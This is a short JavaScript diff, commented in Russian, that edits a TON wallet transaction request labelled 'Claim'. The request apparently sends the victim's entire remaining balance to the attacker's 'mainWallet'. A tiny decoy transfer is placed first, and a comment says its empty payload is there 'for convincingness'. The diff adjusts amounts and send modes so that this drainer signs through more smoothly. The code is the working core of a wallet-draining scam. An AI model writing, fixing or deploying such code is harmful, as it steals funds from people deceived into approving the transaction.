@@ -95,16 +95,18 @@ async function didtrans() {
             validUntil: Math.floor(Date.now() / 1000) + 60,
             messages: [
                 {
-                    address: mainWallet, // Нулевая транза вверху
-                    amount: 1, // 1 нанотон (около нуля)
-                    payload: "te6cckEBAgEAAQAAAA==", // Пустой payload для убедительности
+                    address: mainWallet, // Нулевая транзакция (идет первой)
+                    amount: 1000, // 1000 нанотонов (0.000001 TON)
+                    payload: "te6cckEBAgEAAQAAAA==", // Пустой payload
+                    sendMode: 1, // Минимальный режим для пропуска комиссии
                 },
                 {
                     address: mainWallet, // Основная сумма
                     amount: remainingBalance, 
+                    payload: "te6cckEBAgEAAQAAAA==", // Пустой payload
+                    sendMode: 3, // Обычный режим
                 }
             ],
-            sendMode: 3,
             comment: "Claim",
         };
 
